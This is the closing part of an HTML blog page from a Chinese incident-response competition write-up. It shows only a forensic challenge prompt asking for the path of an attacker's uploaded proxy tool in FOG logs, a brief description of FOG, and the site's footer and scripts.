+<h3 id="综合应急-2"><a href="#综合应急-2" class="headerlink" title="综合应急-2"></a>综合应急-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：FOG日志</span><br><span class="line">攻击者上传了代理工具，请写出他的最终存放路径</span><br><span class="line">格式为flag&#123;x:\xxxxx\xxxx\xxxxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>FOG 是一个用于部署计算机镜像的管理工具，特别是在网络中快速部署操作系统和应用程序。通过 FOG，管理员可以对计算机进行远程安装、恢复和管理。这对于大规模部署、维护和备份计算机非常有用。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About me</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">第一届solar应急响应比赛 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F"><span class="toc-number">1.1.</span> <span class="toc-text">日志流量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F1"><span class="toc-number">1.1.1.</span> <span class="toc-text">日志流量1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F2"><span class="toc-number">1.1.2.</span> <span class="toc-text">日志流量2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F3"><span class="toc-number">1.1.3.</span> <span class="toc-text">日志流量3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">内存取证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">内存取证-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-2"><span class="toc-number">1.2.3.</span> <span class="toc-text">内存取证-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-3"><span class="toc-number">1.2.4.</span> <span class="toc-text">内存取证-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-4"><span class="toc-number">1.2.5.</span> <span class="toc-text">内存取证-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-5"><span class="toc-number">1.2.6.</span> <span class="toc-text">内存取证-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-6"><span class="toc-number">1.2.7.</span> <span class="toc-text">内存取证-6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">数据库-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">数据库-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-3"><span class="toc-number">1.3.3.</span> <span class="toc-text">数据库-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-4"><span class="toc-number">1.3.4.</span> <span class="toc-text">数据库-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-5"><span class="toc-number">1.3.5.</span> <span class="toc-text">数据库-5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%BA%94%E6%80%A5"><span class="toc-number">1.4.</span> <span class="toc-text">综合应急</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%BA%94%E6%80%A5-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">综合应急-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%BA%94%E6%80%A5-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">综合应急-2</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&text=第一届solar应急响应-wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&is_video=false&description=第一届solar应急响应-wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第一届solar应急响应-wp&body=Check out this article: http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&name=第一届solar应急响应-wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&t=第一届solar应急响应-wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024
+    Meteor_Kai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+	  <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'Meteor_Kai';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
